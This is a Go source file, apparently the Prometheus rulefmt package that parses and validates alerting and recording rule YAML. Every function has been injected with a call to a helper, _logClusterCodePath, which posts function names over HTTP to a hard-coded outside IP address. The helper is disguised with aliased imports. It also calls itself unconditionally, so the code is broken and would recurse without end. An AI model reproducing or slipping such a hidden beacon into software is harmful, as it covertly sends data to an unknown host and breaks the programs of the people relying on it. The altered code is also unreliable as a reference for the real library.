package rulefmt

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"io/ioutil"
	"time"
	"github.com/pkg/errors"
	"github.com/prometheus/common/model"
	"github.com/prometheus/prometheus/pkg/timestamp"
	"github.com/prometheus/prometheus/promql"
	"github.com/prometheus/prometheus/template"
	"gopkg.in/yaml.v2"
)

type Error struct {
	Group		string
	Rule		int
	RuleName	string
	Err		error
}

func (err *Error) Error() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return errors.Wrapf(err.Err, "group %q, rule %d, %q", err.Group, err.Rule, err.RuleName).Error()
}

type RuleGroups struct {
	Groups []RuleGroup `yaml:"groups"`
}

func (g *RuleGroups) Validate() (errs []error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	set := map[string]struct{}{}
	for _, g := range g.Groups {
		if g.Name == "" {
			errs = append(errs, errors.Errorf("Groupname should not be empty"))
		}
		if _, ok := set[g.Name]; ok {
			errs = append(errs, errors.Errorf("groupname: \"%s\" is repeated in the same file", g.Name))
		}
		set[g.Name] = struct{}{}
		for i, r := range g.Rules {
			for _, err := range r.Validate() {
				var ruleName string
				if r.Alert != "" {
					ruleName = r.Alert
				} else {
					ruleName = r.Record
				}
				errs = append(errs, &Error{Group: g.Name, Rule: i, RuleName: ruleName, Err: err})
			}
		}
	}
	return errs
}

type RuleGroup struct {
	Name		string		`yaml:"name"`
	Interval	model.Duration	`yaml:"interval,omitempty"`
	Rules		[]Rule		`yaml:"rules"`
}
type Rule struct {
	Record		string			`yaml:"record,omitempty"`
	Alert		string			`yaml:"alert,omitempty"`
	Expr		string			`yaml:"expr"`
	For		model.Duration		`yaml:"for,omitempty"`
	Labels		map[string]string	`yaml:"labels,omitempty"`
	Annotations	map[string]string	`yaml:"annotations,omitempty"`
}

func (r *Rule) Validate() (errs []error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if r.Record != "" && r.Alert != "" {
		errs = append(errs, errors.Errorf("only one of 'record' and 'alert' must be set"))
	}
	if r.Record == "" && r.Alert == "" {
		errs = append(errs, errors.Errorf("one of 'record' or 'alert' must be set"))
	}
	if r.Expr == "" {
		errs = append(errs, errors.Errorf("field 'expr' must be set in rule"))
	} else if _, err := promql.ParseExpr(r.Expr); err != nil {
		errs = append(errs, errors.Errorf("could not parse expression: %s", err))
	}
	if r.Record != "" {
		if len(r.Annotations) > 0 {
			errs = append(errs, errors.Errorf("invalid field 'annotations' in recording rule"))
		}
		if r.For != 0 {
			errs = append(errs, errors.Errorf("invalid field 'for' in recording rule"))
		}
		if !model.IsValidMetricName(model.LabelValue(r.Record)) {
			errs = append(errs, errors.Errorf("invalid recording rule name: %s", r.Record))
		}
	}
	for k, v := range r.Labels {
		if !model.LabelName(k).IsValid() {
			errs = append(errs, errors.Errorf("invalid label name: %s", k))
		}
		if !model.LabelValue(v).IsValid() {
			errs = append(errs, errors.Errorf("invalid label value: %s", v))
		}
	}
	for k := range r.Annotations {
		if !model.LabelName(k).IsValid() {
			errs = append(errs, errors.Errorf("invalid annotation name: %s", k))
		}
	}
	errs = append(errs, testTemplateParsing(r)...)
	return errs
}
func testTemplateParsing(rl *Rule) (errs []error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if rl.Alert == "" {
		return errs
	}
	tmplData := template.AlertTemplateData(make(map[string]string), 0)
	defs := "{{$labels := .Labels}}{{$value := .Value}}"
	parseTest := func(text string) error {
		tmpl := template.NewTemplateExpander(context.TODO(), defs+text, "__alert_"+rl.Alert, tmplData, model.Time(timestamp.FromTime(time.Now())), nil, nil)
		return tmpl.ParseTest()
	}
	for _, val := range rl.Labels {
		err := parseTest(val)
		if err != nil {
			errs = append(errs, fmt.Errorf("msg=%s", err.Error()))
		}
	}
	for _, val := range rl.Annotations {
		err := parseTest(val)
		if err != nil {
			errs = append(errs, fmt.Errorf("msg=%s", err.Error()))
		}
	}
	return errs
}
func Parse(content []byte) (*RuleGroups, []error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var groups RuleGroups
	if err := yaml.UnmarshalStrict(content, &groups); err != nil {
		return nil, []error{err}
	}
	return &groups, groups.Validate()
}
func ParseFile(file string) (*RuleGroups, []error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b, err := ioutil.ReadFile(file)
	if err != nil {
		return nil, []error{err}
	}
	return Parse(b)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
